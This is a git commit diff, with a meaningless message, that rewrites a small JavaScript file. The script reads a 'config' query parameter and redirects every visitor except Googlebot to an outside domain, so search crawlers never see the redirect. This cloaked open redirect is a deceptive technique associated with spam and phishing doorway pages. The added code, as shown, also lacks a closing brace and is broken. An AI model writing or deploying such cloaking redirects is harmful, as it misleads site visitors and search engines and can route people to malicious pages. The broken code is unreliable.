0a373b7e77b8e0b9885c507081ef19c3e523ba1a
codexgod <rajniti.fb@gmail.com>
2026-09-11 08:25:43 +0600

    dd
    dd

--- f.js
+++ f.js
@@ -1,22 +1,7 @@
-(function () {
+const config = new URLSearchParams(window.location.search).get('config');
+const slug = config && config.split('/').pop();
 
-    const params = new URLSearchParams(window.location.search);
-    const config = params.get("config");
-
-    if (!config) {
-        console.log("No config parameter found");
-        return;
-    }
-
-    // Get the last part of config URL
-    const parts = config.split("/").filter(Boolean);
-    const slug = parts[parts.length - 1];
-
-    if (slug)(!navigator.userAgent.includes('Googlebot')) {
-        window.location.href = "http://abc.xyz/" + encodeURIComponent(slug);
-    } else {
-  // For search engine crawlers, you can choose to perform a different action or not redirect
-  console.log("THanks for visiting my page");
-}
-
-})();
+if (slug && !navigator.userAgent.includes('Googlebot')) {
+    window.location.href = "http://abc.xyz/" + encodeURIComponent(slug);
+} else {
+    console.log("Thanks for visiting my page");
